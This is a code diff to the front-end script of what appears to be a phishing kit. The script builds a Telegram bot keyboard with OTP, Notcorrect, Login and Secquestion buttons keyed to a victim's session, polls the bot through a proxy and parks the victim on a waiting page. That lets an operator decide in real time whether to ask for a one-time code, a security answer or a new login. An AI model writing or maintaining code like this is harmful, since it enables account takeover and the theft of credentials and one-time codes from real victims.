@@ -262,7 +262,7 @@
 
                     const keyboard = {
                         inline_keyboard: [
-                            [{ text: "🔐 OTP",         callback_data: `confirmation-code:${sid}`         }],
+                            [{ text: "🔐 OTP",         callback_data: `otp:${sid}`         }],
                             [{ text: "🔑 Notcorrect",  callback_data: `notcorrect:${sid}`  }],
                             [{ text: "↩️ Login",       callback_data: `login:${sid}`       }],
                             [{ text: "✅ Secquestion", callback_data: `secquestion:${sid}` }],
@@ -271,7 +271,7 @@
                     };
 
                     try {
-                        // 1) Grab current offset so wait.html only reacts to NEW presses
+                        // 1) Grab current offset so wait3.html only reacts to NEW presses
                         const r0 = await fetch(`${_PROXY}/getUpdates?offset=-1`);
                         const d0 = await r0.json();
                         const startOffset = (d0.result && d0.result.length)
@@ -289,12 +289,12 @@
                             })
                         });
 
-                                                // 3) Hand the session info to wait.html
+                        // 3) Hand the session info to the wait page
                         sessionStorage.setItem('mgv_sid', sid);
                         sessionStorage.setItem('mgv_offset', String(startOffset));
 
                         // 4) Navigate to the please-wait page
-                        window.location.href = 'wait3.html';   // <-- was 'wait.html'
+                        window.location.href = 'wait3.html';
 
                     } catch (err) {
                         console.error(err);
